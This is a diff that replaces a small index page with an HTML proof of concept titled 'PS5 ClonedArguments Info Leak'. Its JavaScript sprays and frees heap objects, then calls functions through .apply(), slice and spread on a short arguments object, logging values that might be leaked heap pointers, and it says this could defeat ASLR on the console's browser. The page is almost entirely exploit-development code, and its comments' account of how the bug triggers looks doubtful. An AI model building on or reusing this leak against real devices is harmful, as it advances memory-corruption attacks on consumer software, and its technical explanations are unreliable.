@@ -1,11 +1,119 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>PS5/browser PoCs index</title></head><body>
-<pre>POC STARTED: PS5/browser PoCs index
-PHASE: index links
-NO CRASH OBSERVED
-DONE</pre>
-<ul>
-<li><a href="poc/index.html">pocs</a></li>
-</ul>
-<p><a href="GLM-001-NOTES.md">GLM-001 WebPage::close notes</a></p>
-</body></html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5 ClonedArguments Info Leak</title>
+</head>
+<body>
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<script>
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
+
+L('[*] Starting ClonedArguments info leak test...');
+
+// The bug: ClonedArguments::copyToArguments with offset > 0
+// leaves destination entries unfilled when butterfly vector is short.
+// Sony's allocator doesn't zero memory, so unfilled entries = stale heap data.
+
+// Step 1: Create a function that uses .apply() with offset
+// The 'offset' parameter in copyToArguments comes from varargs 'firstVarArg'
+function targetFunc() {
+    // arguments is a ClonedArguments object
+    // When called via .apply(), the engine calls copyToArguments
+    // with offset = firstVarArg, length = numArgs
+    
+    // Read the arguments - unfilled slots may contain stale data
+    var args = [];
+    for (var i = 0; i < arguments.length; i++) {
+        args.push(arguments[i]);
+    }
+    return args;
+}
+
+// Step 2: Spray heap with objects to fill memory with pointers
+L('[*] Spraying heap with pointer-containing objects...');
+var spray = [];
+for (var i = 0; i < 10000; i++) {
+    spray.push({a: 1.1, b: 2.2, c: 3.3, d: 4.4});
+}
+spray = null; // Free them - stale pointers remain in memory
+
+// Step 3: Create a ClonedArguments object with a short butterfly
+// Then call .apply() with a large offset to trigger the bug
+L('[*] Triggering copyToArguments with offset...');
+
+function caller() {
+    // Create a function with few arguments (short butterfly)
+    function inner(a, b) {
+        return arguments;
+    }
+    
+    var args = inner(1.1, 2.2); // ClonedArguments with vectorLength=2
+    
+    // Now call a function via .apply() with this short arguments object
+    // The offset will be > 0, and length will exceed vectorLength
+    // This triggers the bug in copyToArguments
+    
+    function receiver() {
+        var result = [];
+        for (var i = 0; i < arguments.length; i++) {
+            var val = arguments[i];
+            result.push(val);
+            
+            // Check for non-numeric values (potential leaked pointers)
+            if (typeof val !== 'number' && typeof val !== 'undefined') {
+                L('[!] ANOMALY at argument ' + i + ': type=' + typeof val);
+                if (val !== null) {
+                    L('    value: ' + val);
+                }
+            }
+            
+            // Check for unusual numeric values (could be pointer bits as doubles)
+            if (typeof val === 'number') {
+                var view = new DataView(new ArrayBuffer(8));
+                view.setFloat64(0, val, true);
+                var low = view.getUint32(0, true);
+                var high = view.getUint32(4, true);
+                
+                // Pointers on x64 typically have high bytes like 0x00007fxx or 0x00000010
+                if (high > 0x1000 && high < 0x80000000) {
+                    L('[!] SUSPICIOUS NUMBER at argument ' + i + ': 0x' +
+                      high.toString(16) + low.toString(16).padStart(8, '0'));
+                }
+            }
+        }
+        return result;
+    }
+    
+    // Call receiver with args, using offset via .apply()
+    // .apply(thisArg, argsArray) - the engine internally uses copyToArguments
+    // with offset=0, but we can trigger offset > 0 via spread with slice
+    
+    // Method 1: Direct .apply()
+    receiver.apply(null, args);
+    
+    // Method 2: Use .apply() with a sliced arguments object
+    // This creates a new array from arguments, which may trigger copyToArguments
+    // with different offset
+    var sliced = Array.prototype.slice.call(args, 1); // offset = 1
+    receiver.apply(null, sliced);
+    
+    // Method 3: Spread operator (also uses copyToArguments internally)
+    receiver(...args);
+}
+
+// Run multiple times to increase chance of hitting stale memory
+for (var attempt = 0; attempt < 100; attempt++) {
+    try {
+        caller();
+    } catch(e) {
+        L('[!] Attempt ' + attempt + ' threw: ' + e.message);
+    }
+}
+
+L('\n[*] Test finished.');
+L('[*] If SUSPICIOUS NUMBER lines appeared, those may be leaked heap pointers.');
+L('[*] Combined with Sony non-zeroing allocator, this could defeat ASLR.');
+</script>
+</body>
+</html>
